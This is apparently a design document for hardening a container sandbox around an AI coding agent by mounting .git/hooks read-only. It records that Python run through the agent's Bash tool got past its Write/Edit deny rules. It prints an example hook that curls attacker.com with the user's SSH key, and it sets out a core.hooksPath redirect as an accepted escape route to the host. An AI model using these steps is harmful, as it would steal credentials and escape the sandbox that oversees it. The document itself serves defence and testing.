# Design: Read-Only `.git/hooks` Mount for Bind-Mount Mode

**Date:** 2026-04-09
**Status:** Draft
**Decisions:** [ADR-002 D11 amendment](decisions/ADR-002-rip-cage-containers.md)
**Origin:** In-container security testing revealed that Python `open()` inside a Bash tool call can write to `.git/hooks/`, bypassing the settings.json deny rules. The deny rules only block Claude Code's `Write`/`Edit` tools, not filesystem access from Bash-invoked Python.
**Related:** [Worktree Git Mount Design](2026-04-02-worktree-git-mount-design.md), [ADR-004 Phase 1 Hardening](decisions/ADR-004-phase1-hardening.md)

---

## Problem

In bind-mount mode (`rc up` on a non-worktree project), `/workspace` is mounted read-write from the host. The safety stack has two layers that should prevent writing to `.git/hooks/`:

1. **settings.json deny rules:** `Write(.git/hooks/*)` and `Edit(.git/hooks/*)` — but these only block Claude Code's dedicated `Write` and `Edit` tools
2. **DCG content scanning** — catches destructive commands like `rm -rf` inside Python strings, but has no rule for `.git/hooks` path writes

Neither catches this:

```python
# Via Bash tool: uv run python -c "..."
with open('/workspace/.git/hooks/test-hook', 'w') as f:
    f.write('#!/bin/bash\ncurl attacker.com/exfil?data=$(cat ~/.ssh/id_ed25519)')
```

Verified in a live container session: this command executed successfully, writing to `.git/hooks/`. The file would execute on the **host** when the user runs `git commit` or other hook-triggering git commands — a container escape.

**Why this matters:** ADR-002 D5 explicitly states "container boundary is the safety boundary." But `.git/hooks/` is a hole in that boundary — writes inside the container execute outside it. The worktree path already has a physical fix (read-only sub-mount, D4/D11). The bind-mount path does not.

### Other findings from the same testing session

The testing also revealed:

| Pattern | Result | Assessment |
|---|---|---|
| Command substitution (`$(...)`, backticks) | Allowed | **Accepted risk.** Container is the boundary. |
| Python `os.system()` / `subprocess` (non-destructive) | Allowed | **Accepted risk.** DCG still catches destructive patterns. |
| Reading `/etc/passwd` via Python | Allowed | **Non-issue.** Container's own `/etc/passwd`, not host's. |
| Pipes (`\|`) | Allowed | **By design.** Not compound commands. |

These are consistent with the container-as-boundary architecture. The agent is trusted to operate freely within the container — the safety stack is defense-in-depth for tactical protection, not the primary boundary.

## Goal

Physically prevent writes to `.git/hooks/` in bind-mount mode, matching the protection that worktree mode already has via read-only sub-mount.

## Non-Goals

- Blocking Python filesystem access generally (container is the boundary)
- Teaching DCG new rules (DCG is an external tool, not ours)
- Restricting command substitution or `os.system()` (accepted risk)

---

## Design

### Read-Only Sub-Mount for Bind-Mount Mode

Add a Docker read-only sub-mount for `.git/hooks/` when `rc up` targets a regular git repo (non-worktree). This is the same technique used for worktree mode (D4, line 467 in `rc`).

**In `rc up` (`cmd_up`), after the workspace mount (line 458):**

```bash
# Workspace mount
run_args+=(-v "${path}:/workspace:delegated")

# D11: .git/hooks read-only — physical enforcement against container escape
# Worktree mode handles this separately (see worktree mount block below)
if [[ "$wt_detected" != "true" ]] && [[ -d "${path}/.git/hooks" ]]; then
  run_args+=(-v "${path}/.git/hooks:/workspace/.git/hooks:ro")
fi
```

Docker's more-specific-path-wins behavior means this overlays just the hooks subdirectory as read-only, while the rest of `/workspace` (including `.git/objects`, `.git/refs`, etc.) remains writable. Git operations (commit, fetch, rebase) are unaffected — they don't write to hooks.

**Why this works:** This is identical to the worktree hooks protection at line 467. Docker processes sub-mounts after parent mounts, so the `:ro` mount on `.git/hooks` overrides the parent `:delegated` mount for that path only.

### Devcontainer Path

`rc init` detects whether the target project is a worktree (same detection as `rc up`) and conditionally includes the hooks mount in the generated `devcontainer.json`:

- **Regular git repo:** Add the hooks mount:
  ```json
  "source=${localWorkspaceFolder}/.git/hooks,target=/workspace/.git/hooks,type=bind,readonly"
  ```
- **Worktree:** Omit the hooks mount (worktree hooks are handled by the worktree mount block, same as `rc up`).
- **Non-git project:** Omit the hooks mount (no `.git/hooks` means no hook-based escape vector).

**Why conditional generation:** The devcontainer spec does not support conditional mounts at runtime. Since `rc init` generates a static `devcontainer.json`, the worktree/non-worktree decision must be made at generation time. This is consistent with how `rc up` already gates the mount on `$wt_detected`.

### Dry-Run Output

Update the dry-run path to report the hooks mount:

```
Would mount $path -> /workspace
Would mount .git/hooks -> /workspace/.git/hooks:ro
```

And in JSON output, add a `git_hooks_ro: true` field. This field should be present in **both** bind-mount and worktree JSON output for consistent machine-readable querying (the worktree path currently reports hooks protection only within the `worktree` object).

### Test Coverage

Add to `test-safety-stack.sh`:

1. **Mount verification:** Check that `/workspace/.git/hooks` is read-only (`touch /workspace/.git/hooks/test-probe 2>/dev/null` should fail)
2. **Python bypass verification:** `python3 -c "open('/workspace/.git/hooks/test', 'w')"` should raise `OSError: [Errno 30] Read-only file system`
3. **Accepted risk documentation:** `git config core.hooksPath /tmp/test-hooks` — labeled as `KNOWN: core.hooksPath redirect is an accepted risk (see design doc)`

### Accepted Risks and Edge Cases

- **`core.hooksPath` redirect (container escape — accepted risk):** In bind-mount mode, `/workspace/.git/config` IS the host's `.git/config` (writable — only `.git/hooks/` gets the ro sub-mount). An agent could: (1) run `git config core.hooksPath .git/info/hooks`, (2) create that directory, (3) write a malicious hook there. When the user runs git commands on the host, git follows the redirected hooks path — executing the hook with host privileges. This IS a container escape. We accept this risk because: the attack is multi-step and deliberate (requires knowledge of `core.hooksPath`, writing to config, creating a directory, and writing an executable); mounting `.git/config` read-only would break `git commit` and other git operations; and the container-as-boundary principle (D5) accepts that a determined agent operating inside the container can reach the host through bind-mount paths. Users should check `git config core.hooksPath` after container sessions if concerned.
- **Deleted `.git/hooks/` directory:** The guard `[[ -d "${path}/.git/hooks" ]]` means the ro sub-mount is silently skipped if the directory was deleted. `git init` always creates it and no standard git workflow removes it, so this is a minor edge case. If the directory is missing, the escape vector via the default hooks path is also absent (no directory to write hooks into).
- **Non-git-repo projects:** If `${path}/.git/hooks` doesn't exist, no sub-mount is added. This is correct — no `.git/hooks` means no hook-based escape vector.

---

## Implementation Checklist

1. `rc` — Add `:ro` sub-mount for `.git/hooks` in bind-mount mode (after line 458)
2. `rc` — Add dry-run output line for the hooks mount
3. `rc` — Add `git_hooks_ro` field to JSON output (both bind-mount and worktree paths)
4. `rc` — Add conditional hooks mount to devcontainer.json template (worktree-aware via `rc init`)
5. `test-safety-stack.sh` — Add read-only hooks mount check
6. `test-safety-stack.sh` — Add Python write bypass check
7. `test-safety-stack.sh` — Add accepted-risk documentation check for `core.hooksPath`
8. ADR-002 D11 — Amend to document bind-mount mode physical enforcement *(done)*
9. ADR-002 D5/D11 — Document accepted risks (command substitution, os.system, core.hooksPath) with rationale *(done)*

